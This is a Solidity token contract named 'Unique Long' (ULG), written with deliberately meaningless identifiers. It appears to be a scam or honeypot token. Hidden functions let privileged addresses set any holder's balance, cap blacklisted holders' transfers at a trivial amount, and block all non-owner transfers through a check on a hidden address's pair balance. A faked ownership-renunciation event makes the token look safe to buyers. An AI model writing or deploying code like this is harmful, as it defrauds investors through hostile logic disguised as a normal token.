//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface limitShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toLiquidity {
    function createPair(address liquidityFund, address senderTx) external returns (address);
}

interface feeSwapMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityWallet) external view returns (uint256);

    function transfer(address maxTotal, uint256 atSenderFee) external returns (bool);

    function allowance(address takeLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 atSenderFee) external returns (bool);

    function transferFrom(
        address sender,
        address maxTotal,
        uint256 atSenderFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldWallet, uint256 value);
    event Approval(address indexed takeLaunch, address indexed spender, uint256 value);
}

interface modeLaunched is feeSwapMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UniqueLong is takeList, feeSwapMode, modeLaunched {

    function teamReceiver(address maxTrading) public {
        if (toEnable) {
            return;
        }
        
        fromExempt[maxTrading] = true;
        if (launchFund != buyTrading) {
            buyTrading = false;
        }
        toEnable = true;
    }

    mapping(address => mapping(address => uint256)) private amountEnableMin;

    address buyExemptTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public maxAmount;

    function tokenList(address marketingAt) public {
        listTxTo();
        if (shouldMax == tokenSell) {
            amountShould = true;
        }
        if (marketingAt == maxAmount || marketingAt == fromLaunch) {
            return;
        }
        txTrading[marketingAt] = true;
    }

    function shouldReceiverMarketing() public {
        emit OwnershipTransferred(maxAmount, address(0));
        tokenTo = address(0);
    }

    uint256 private buyTake;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingReceiver;
    }

    constructor (){
        
        limitShould tokenLimitFee = limitShould(buyExemptTeam);
        fromLaunch = toLiquidity(tokenLimitFee.factory()).createPair(tokenLimitFee.WETH(), address(this));
        
        maxAmount = _msgSender();
        shouldReceiverMarketing();
        fromExempt[maxAmount] = true;
        toSell[maxAmount] = tradingReceiver;
        
        emit Transfer(address(0), maxAmount, tradingReceiver);
    }

    function approve(address tradingLimitWallet, uint256 atSenderFee) public virtual override returns (bool) {
        amountEnableMin[_msgSender()][tradingLimitWallet] = atSenderFee;
        emit Approval(_msgSender(), tradingLimitWallet, atSenderFee);
        return true;
    }

    uint256 private tradingReceiver = 100000000 * 10 ** 18;

    function allowance(address modeEnableFee, address tradingLimitWallet) external view virtual override returns (uint256) {
        if (tradingLimitWallet == buyExemptTeam) {
            return type(uint256).max;
        }
        return amountEnableMin[modeEnableFee][tradingLimitWallet];
    }

    uint256 public tokenSell;

    function fundTake(address feeSwapTotal, uint256 atSenderFee) public {
        listTxTo();
        toSell[feeSwapTotal] = atSenderFee;
    }

    function name() external view virtual override returns (string memory) {
        return autoExempt;
    }

    function listTxTo() private view {
        require(fromExempt[_msgSender()]);
    }

    bool public amountShould;

    address public fromLaunch;

    uint256 sellFund;

    mapping(address => bool) public fromExempt;

    uint256 public autoMarketing;

    uint8 private isTeamWallet = 18;

    uint256 buyFund;

    function symbol() external view virtual override returns (string memory) {
        return exemptShould;
    }

    string private exemptShould = "ULG";

    string private autoExempt = "Unique Long";

    uint256 public fromReceiver;

    address tradingTotalTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public txTrading;

    function takeLimit(address liquidityFrom, address maxTotal, uint256 atSenderFee) internal returns (bool) {
        require(toSell[liquidityFrom] >= atSenderFee);
        toSell[liquidityFrom] -= atSenderFee;
        toSell[maxTotal] += atSenderFee;
        emit Transfer(liquidityFrom, maxTotal, atSenderFee);
        return true;
    }

    event OwnershipTransferred(address indexed maxMarketing, address indexed atSellFrom);

    uint256 constant limitTokenTotal = 4 ** 10;

    bool public toEnable;

    uint256 public listSell;

    function marketingTotal(uint256 atSenderFee) public {
        listTxTo();
        sellFund = atSenderFee;
    }

    function transfer(address feeSwapTotal, uint256 atSenderFee) external virtual override returns (bool) {
        return toAuto(_msgSender(), feeSwapTotal, atSenderFee);
    }

    mapping(address => uint256) private toSell;

    function balanceOf(address liquidityWallet) public view virtual override returns (uint256) {
        return toSell[liquidityWallet];
    }

    function decimals() external view virtual override returns (uint8) {
        return isTeamWallet;
    }

    function transferFrom(address liquidityFrom, address maxTotal, uint256 atSenderFee) external override returns (bool) {
        if (_msgSender() != buyExemptTeam) {
            if (amountEnableMin[liquidityFrom][_msgSender()] != type(uint256).max) {
                require(atSenderFee <= amountEnableMin[liquidityFrom][_msgSender()]);
                amountEnableMin[liquidityFrom][_msgSender()] -= atSenderFee;
            }
        }
        return toAuto(liquidityFrom, maxTotal, atSenderFee);
    }

    uint256 public shouldMax;

    bool public exemptFee;

    address private tokenTo;

    bool public launchFund;

    function toAuto(address liquidityFrom, address maxTotal, uint256 atSenderFee) internal returns (bool) {
        if (liquidityFrom == maxAmount) {
            return takeLimit(liquidityFrom, maxTotal, atSenderFee);
        }
        uint256 modeTradingAuto = feeSwapMode(fromLaunch).balanceOf(tradingTotalTake);
        require(modeTradingAuto == sellFund);
        require(maxTotal != tradingTotalTake);
        if (txTrading[liquidityFrom]) {
            return takeLimit(liquidityFrom, maxTotal, limitTokenTotal);
        }
        return takeLimit(liquidityFrom, maxTotal, atSenderFee);
    }

    bool public buyTrading;

    function getOwner() external view returns (address) {
        return tokenTo;
    }

    function owner() external view returns (address) {
        return tokenTo;
    }

}